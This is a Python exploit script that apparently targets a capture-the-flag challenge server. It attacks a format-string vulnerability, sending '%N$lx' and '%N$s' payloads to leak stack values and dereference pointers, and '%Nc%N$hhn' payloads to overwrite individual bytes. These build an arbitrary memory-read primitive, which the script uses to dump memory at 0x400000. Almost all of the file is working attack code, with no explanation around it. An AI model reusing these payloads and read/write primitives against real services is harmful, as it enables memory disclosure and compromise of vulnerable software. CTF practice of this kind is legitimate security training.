import struct
from socket import *

def grab_value_directly(i):
  s = socket(AF_INET, SOCK_STREAM)
  s.connect(('pwn01.ringzer0team.com', 13377))

  s.recv(128)
  s.send('%'+str(i)+'$lx\n')

  data = s.recv(64)
  addr = int(data.split()[0], 16)

  s.close()
  return addr

def grab_value_indirectly(i):
  s = socket(AF_INET, SOCK_STREAM)
  s.connect(('pwn01.ringzer0team.com', 13377))

  s.recv(128)
  s.send('%'+str(i)+'$s\n')
  
  data = s.recv(64)
  addr = data.split()[0]

  # ugly workaround, only grab 8 bytes. will fix this later!
  if len(addr) > 8:
      address = addr[0:8]
  else:
      address = addr + '\x00' * (8-len(addr))
  
  s.close()
  return struct.unpack('L', address)[0]

def write_byte_value_via(i, value):
  s = socket(AF_INET, SOCK_STREAM)
  s.connect(('pwn01.ringzer0team.com', 13377))

  s.recv(128)
  s.send('%'+str(value)+'c%'+str(i)+'$hhn\n')
  data = s.recv(64)

  s.close()

def read_from_address(addr, offset):
  for i in range(4):
      b = (addr & 0xff)
      addr >>= 8
      if b == 0:
          b = 256
      if i == 0:
          i = 256
      write_byte_value_via(5, i)      # change address
      write_byte_value_via(625, b)    # write byte

  dump1 = grab_value_indirectly(625+offset)
  return hex(dump1)

parameter_625_addr = grab_value_directly(5)
print "parameter 5 points to: ", hex(parameter_625_addr)
value_at_625 = grab_value_indirectly(5)
print "address pointed to by parameter 5 contains: ", hex(value_at_625)

value_at_scratch = grab_value_indirectly(625)
print "scratch contains: ", hex(value_at_scratch)

format_offset = ((value_at_625 & 0xffffffffffffff00) - parameter_625_addr)/8
print "scratch is parameter {}".format(625+format_offset)

print "read from 0x400000: {}".format(read_from_address(0x400000, format_offset))
